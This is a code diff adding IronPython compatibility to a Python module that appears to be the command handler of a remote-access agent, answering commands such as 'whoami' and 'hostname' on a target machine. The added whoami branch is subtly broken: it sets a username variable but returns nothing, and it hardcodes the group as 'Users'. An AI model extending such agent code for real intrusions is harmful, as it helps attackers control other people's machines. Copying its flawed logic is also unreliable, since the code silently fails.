@@ -19,11 +19,15 @@ import imp
 import marshal
 import re
 import shutil
-import pwd
 import socket
 import math
 import stat
-import grp
+import platform
+if platform.python_implementation() == 'IronPython':
+    from System import Environment
+else:
+    import pwd
+    import grp
 from stat import S_ISREG, ST_CTIME, ST_MODE
 from os.path import expanduser
 from StringIO import StringIO
@@ -906,9 +910,13 @@ def directory_listing(path):
             permstr = "d{}".format(permstr)
         else:
             permstr = "-{}".format(permstr)
-
-        user = pwd.getpwuid(fstat.st_uid)[0]
-        group = grp.getgrgid(fstat.st_gid)[0]
+        if platform.python_implementation() == 'IronPython':
+            user = Environment.UserName
+            #Needed?
+            group = "Users"
+        else:
+            user = pwd.getpwuid(fstat.st_uid)[0]
+            group = grp.getgrgid(fstat.st_gid)[0]
 
         # Convert file size to MB, KB or Bytes
         if (fstat.st_size > 1024 * 1024):
@@ -961,7 +969,10 @@ def run_command(command, cmdargs=None):
         return "Created directory: {}".format(cmdargs)
 
     elif re.compile("(whoami|getuid)").match(command):
-        return pwd.getpwuid(os.getuid())[0]
+        if platform.python_implementation() == 'IronPython':
+            username = Environment.UserName
+        else:
+            return pwd.getpwuid(os.getuid())[0]
 
     elif re.compile("hostname").match(command):
         return str(socket.gethostname())
